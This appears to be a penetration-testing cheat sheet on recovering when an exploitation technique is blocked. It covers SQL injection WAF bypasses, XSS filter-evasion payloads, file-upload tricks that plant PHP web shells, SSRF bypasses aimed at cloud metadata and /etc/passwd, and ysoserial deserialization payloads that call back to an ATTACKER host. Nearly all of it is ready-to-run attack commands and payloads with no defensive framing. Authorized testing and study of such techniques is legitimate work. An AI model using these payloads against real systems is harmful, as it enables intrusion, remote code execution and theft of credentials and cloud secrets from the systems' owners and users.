# Failure Recovery — When Exploitation Techniques Fail

> For each major technique: what blocks it, why, and exactly what to try next.
> Never dead-end on a single approach.

---

## SQL Injection Blocked

### WAF Blocking Payloads
```bash
# Try tamper scripts (space bypass, encoding, case variation)
sqlmap -u URL --tamper=space2comment,between,randomcase --random-agent --batch

# Try different injection contexts — WAF may only inspect URL params
# Move injection to: Cookie header, X-Forwarded-For, JSON body, multipart form
sqlmap -u 'http://target/api' --data='{"id":"1*"}' --batch   # JSON body
sqlmap -u URL --cookie='id=1*' --batch --level=3              # cookie injection
sqlmap -r request.txt --batch --level=5                        # full Burp request

# HTTP Parameter Pollution — double param may bypass WAF
curl 'http://target/?id=1&id=UNION+SELECT+1,2,3-- -'

# Chunked encoding (some WAFs skip chunked body inspection)
# Use sqlmap with --chunked flag
sqlmap -u URL --chunked --batch
```

### Input Sanitized (Not WAF)
```bash
# Switch from error-based/UNION to blind techniques
# Time-based bypasses most sanitization that only checks response content
sqlmap -u URL --technique=T --time-sec=3 --batch

# Try second-order: inject in registration/profile, trigger in admin view
# Register with username: admin'-- -
# Then trigger password reset or profile view

# Try numeric context (no quotes needed)
curl 'http://target/?id=1 AND 1=1'   # no quotes = no quote escaping needed

# Stacked queries (if supported by backend)
curl 'http://target/?id=1; SELECT pg_sleep(3)-- -'
```

### Database-Specific Failures
```bash
# MySQL: Try /*!50000UNION*/ inline comment syntax
# PostgreSQL: Try $$ dollar-quoting: $$test$$ instead of 'test'
# MSSQL: Try stacked queries with WAITFOR DELAY
# Oracle: Try UNION SELECT NULL FROM DUAL
```

---

## XSS Filtered

### Script Tags Blocked
```html
<!-- Event handlers (no <script> needed) -->
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<body onpageshow=alert(document.domain)>
<input onfocus=alert(document.domain) autofocus>
<marquee onstart=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
<video src=x onerror=alert(document.domain)>

<!-- SVG injection -->
<svg><script>alert(document.domain)</script></svg>
<svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><text y="1em">click</text></a></svg>
```

### All HTML Tags Blocked
```bash
# If in JavaScript context, break out without HTML
';alert(document.domain)//
\';alert(document.domain)//
</script><script>alert(document.domain)</script>

# Template literal injection (if in backtick context)
${alert(document.domain)}

# Angular/Vue template injection
{{constructor.constructor('alert(1)')()}}
```

### Common Characters Filtered
```bash
# Parentheses blocked — use backtick (ES6)
<img src=x onerror=alert`1`>

# Quotes blocked — use String.fromCharCode
<img src=x onerror=alert(String.fromCharCode(88,83,83))>

# Dots blocked — use bracket notation
<img src=x onerror=alert(document['domain'])>

# alert blocked — use confirm, prompt, or custom function
<img src=x onerror=confirm(document.domain)>
<img src=x onerror=window['al'+'ert'](1)>
```

### Pivot to Other XSS Types
```bash
# If reflected XSS fails → try DOM-based (client-side only, no server filter)
# Check for: location.hash, document.URL, window.name sinks
# Test: http://target/#<img src=x onerror=alert(1)>

# If all XSS fails → try template injection (SSTI)
# Test: {{7*7}} in same input field → 49 = template injection
```

---

## File Upload Blocked

### Extension Filtering Bypass
```bash
# Alternative PHP extensions
shell.php5        # older Apache configs
shell.phtml       # often allowed
shell.phar        # PHP Archive format
shell.phps        # PHP source (sometimes executed)
shell.php7        # PHP 7 specific
shell.pHP         # case variation (Windows/IIS)

# Double extension
shell.php.jpg     # Apache may process as PHP if misconfigured
shell.jpg.php     # some filters only check last extension

# Null byte (PHP < 5.3.4 only)
shell.php%00.jpg

# Trailing characters
shell.php.        # Windows strips trailing dot
shell.php::$DATA  # NTFS Alternate Data Stream (IIS)
shell.php;.jpg    # IIS semicolon truncation
```

### Content-Type / Magic Bytes Bypass
```bash
# Change Content-Type header to allowed type
curl -F 'file=@shell.php;type=image/jpeg' 'http://target/upload'

# Prepend magic bytes to PHP file
printf '\xFF\xD8\xFF\xE0<?php system($_GET["c"]); ?>' > shell.php.jpg

# Polyglot file (valid JPEG + valid PHP)
exiftool -Comment='<?php system($_GET["c"]); ?>' legit_image.jpg
mv legit_image.jpg shell.php.jpg

# GIF polyglot
printf 'GIF89a<?php system($_GET["c"]); ?>' > shell.gif.php
```

### Upload Path Unknown
```bash
# Check upload response headers/body for path
# Brute force common upload directories
ffuf -u 'http://target/FUZZ/shell.php' -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200
# Common locations: /uploads/, /media/, /files/, /assets/, /tmp/, /var/www/uploads/
```

### All Upload Bypasses Fail
```bash
# Look for alternative file write primitives:
# - Admin panel with template/theme editor
# - Config file that allows PHP eval
# - Log poisoning via LFI (inject PHP in User-Agent → include log file)
# - ZIP upload + path traversal: create zip with ../../shell.php
zip exploit.zip ../../var/www/html/shell.php
curl -F 'file=@exploit.zip' 'http://target/upload'
```

---

## SSRF Blocked

### URL Validation Bypass
```bash
# Decimal IP (169.254.169.254 = 2852039166)
curl 'http://target/fetch?url=http://2852039166/'

# Hex IP
curl 'http://target/fetch?url=http://0xA9FEA9FE/'

# Octal IP
curl 'http://target/fetch?url=http://0251.0376.0251.0376/'

# IPv6
curl 'http://target/fetch?url=http://[::ffff:169.254.169.254]/'

# URL encoding
curl 'http://target/fetch?url=http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34/'

# Short form
curl 'http://target/fetch?url=http://169.254.169.254.nip.io/'
```

### Redirect-Based Bypass
```bash
# Host a redirect on attacker server
# attacker_server.py:
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location','http://169.254.169.254/latest/meta-data/')
        self.end_headers()
HTTPServer(('0.0.0.0',80),H).serve_forever()
"

# Trigger SSRF to attacker server → redirects to metadata
curl 'http://target/fetch?url=http://ATTACKER/'
```

### DNS Rebinding
```bash
# Use a DNS rebinding service that alternates between attacker IP and 169.254.169.254
# Services: rebind.it, rbndr.us, or self-hosted with custom DNS server
# First resolution → attacker IP (passes validation)
# Second resolution → 169.254.169.254 (actual request hits metadata)

# Setup with rbndr.us
# Create record: 7f000001.a9fea9fe.rbndr.us
# Alternates between 127.0.0.1 and 169.254.169.254
curl 'http://target/fetch?url=http://7f000001.a9fea9fe.rbndr.us/'
```

### Protocol Alternatives
```bash
# If HTTP blocked, try other protocols
curl 'http://target/fetch?url=file:///etc/passwd'
curl 'http://target/fetch?url=gopher://127.0.0.1:6379/_INFO'
curl 'http://target/fetch?url=dict://127.0.0.1:11211/stats'

# Cloud provider alternative endpoints
# AWS: http://instance-data/ (sometimes works as alias)
# GCP: http://metadata/ or http://metadata.google.internal/
```

---

## Deserialization Failures

### Wrong Gadget Chain
```bash
# If CommonsCollections1 fails, the target may have a different version
# Try all available chains systematically:
for chain in CommonsCollections1 CommonsCollections5 CommonsCollections6 CommonsCollections7 \
  CommonsCollectionsK1 CommonsCollectionsK2 Spring1 Spring2 Groovy1 JRMPClient; do
    echo "Testing: $chain"
    java -jar ysoserial-all.jar $chain 'curl ATTACKER:8888/deser-test' 2>/dev/null | base64 -w0
    echo ""
done

# Use URLDNS first (no gadget dependency) to confirm deserialization occurs
java -jar ysoserial-all.jar URLDNS 'http://deser-confirm.COLLAB.oastify.com' | base64 -w0
# If DNS callback received → deserialization works, just need right gadget
```

### Serialization Format Mismatch
```bash
# Maybe it's not Java — check for other formats:
# PHP: O:4:"User":1:{s:4:"name";s:5:"admin";}
# Python pickle: gASV... (base64) or \x80\x04\x95 (raw)
# .NET: AAEAAAD/////... (base64 BinaryFormatter)
# Ruby: \x04\x08 (Marshal.load)

# Match format to target technology stack identified in recon
```

---

## Template Injection Fails

### Detection Payload Blocked
```bash
# Try alternate template syntaxes
${7*7}          # Freemarker, Velocity
<%= 7*7 %>      # ERB (Ruby)
#{7*7}          # Thymeleaf
#set($x=7*7)${x}  # Velocity
{7*7}           # Smarty (no double braces)

# If all blocked → may not be template injection
# Check for expression language injection (Java EE)
${applicationScope}
${T(java.lang.Runtime).getRuntime().exec('id')}
```

---

## General Recovery Strategy

When any technique is completely blocked:
1. **Switch injection point** — move from URL params to headers, cookies, JSON body, multipart
2. **Switch protocol** — HTTP to WebSocket, REST to GraphQL, GET to POST
3. **Go blind** — if output-based attacks fail, try time-based or OOB DNS
4. **Go second-order** — store payload, trigger from different context
5. **Chain vulnerabilities** — can't get RCE directly? Use info disclosure to find creds, then authenticate
6. **Try adjacent targets** — same vulnerability may exist on different endpoint, subdomain, or API version
